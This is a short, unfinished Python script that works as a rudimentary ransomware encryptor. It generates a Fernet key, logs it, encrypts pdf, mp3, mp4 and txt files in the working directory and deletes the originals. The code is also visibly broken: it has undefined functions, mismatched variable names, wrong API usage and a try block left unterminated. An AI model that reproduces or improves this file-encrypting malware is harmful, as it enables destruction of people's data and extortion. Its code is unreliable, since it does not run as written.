import os
from cryptography.fernet import Fernet
from pconst import const
import re
import time
import subprocess 
import getpass
import datetime  
import csv

 
current_time = datetime.datetime.now()  

user_directory =  (getpass.getuser()). center(25,'_')

parent_dir = "D:/projects/"

path = os.path.join(parent_dir, user_directory) 

os.mkdir(path) 

key = Fernet.generate_key()
with open(path+'/'+'key.csv' , 'a') as key_file:
	msg =f'''
{user_directory} is crypted by: {key} ############ \n time: {current_time}
'''
	csvwriter = csvwriter(key_file)
	csvwriter.writerow(msg)


f = Fernet(key)
files_path=[]
formts = ['pdf','mp3' ,'mp4','txt']
for num in range(length(formts)):
	formts[num] = formts[num] + '$'
	
file_list = os.listdir('.')

for file_name in file_list:
	for formt in formts:
		if re.search(formt , file_name) != None:
			files_path.append(file_name)
			
pathes = open(path+'/'+'pathes.txt' , 'a')
msg =f'''
PATHES OF FILES: {files_path}############ \n time: {current_time}
'''
pathes.write(files_path)
pathes.close()
for file_path in files_path:
	try:
		with open(file_path,'rb+') as texted_file:
			crypetd_texted_file = f.encrypt(texted_file)
		print(file_path , 'CRYPTED'.center(10,'_'))
		os.remove(file_path)
		with open(file_path+'[ENCRYPTED'.center(20,'__') , 'w') as crypted_file:
			crypted_file.write(crypted_texted_file)
			
			
			
	

